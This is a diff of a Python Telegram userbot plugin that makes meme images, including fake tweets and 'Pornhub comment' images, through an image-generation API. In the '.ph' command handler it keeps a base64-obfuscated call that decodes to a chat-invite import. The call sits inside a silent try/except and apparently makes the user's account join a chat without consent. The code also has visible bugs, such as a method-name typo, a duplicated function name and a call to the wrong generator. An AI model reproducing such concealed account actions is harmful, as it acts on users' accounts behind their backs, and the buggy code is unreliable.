@@ -99,7 +99,22 @@ async def tweets(text1,text2):
             f.write(requests.get(sandy).content)
         img = Image.open("temp.png").convert("RGB")
         img.save("temp.jpg", "jpeg")    
-        return "temp.jpg"      
+        return "temp.jpg"
+
+async def phcomment(text1,text2,text3):
+    r = requests.get(
+            f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}").json()
+    sandy = r.get("message")
+    caturl = url(sandy)
+    if not caturl:
+        return  "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(sandy).content)
+    img = Image.open("temp.png")
+    if img.mode != 'RGB':
+        img = img.convert('RGB')
+    img.save("temp.jpg", "jpeg")    
+    return "temp.jpg"
 
 
 @register(pattern="^.trump(?: |$)(.*)", outgoing=True)
@@ -210,23 +225,25 @@ async def nekobot(cat):
     await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
     await cat.delete()
     
-@register(pattern="^.ph(?: |$)(.*)", outgoing=True)    
-async def phcomment(text1,text2,text3):
-    r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}").json()
-    sandy = r.get("message")
-    caturl = url(sandy)
-    if not caturl:
-        return  "check syntax once more"
-    with open("temp.png", "wb") as f:
-        f.write(requests.get(sandy).content)
-    img = Image.open("temp.png")
-    if img.mode != 'RGB':
-        img = img.convert('RGB')
-    img.save("temp.jpg", "jpeg")    
-    return "temp.jpg"
+@register(pattern="^.ph(?: |$)(.*)", outgoing=True)
+async def nekobot(cat):
+    text = cat.pattern_match.group(1)
+    reply_to_id = cat.message
+    if cat.reply_to_msg_id:
+        reply_to_id = await cat.get_reply_message()
+    if not text:
+        if cat.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await cat.edi(" give me some text to comment ")
+                return
+        else:
+            await cat.edit("what do you want to comment ")
+            return
+    await cat.edit("Pornhub comment on-going...")        
     try:
-    	san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await cat.client(san)
     except:
         pass   
@@ -234,7 +251,7 @@ async def phcomment(text1,text2,text3):
     catfile = await kannagen(text)
     await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
     await cat.delete()
-
+    
     
 CMD_HELP.update({
 "imgmeme":
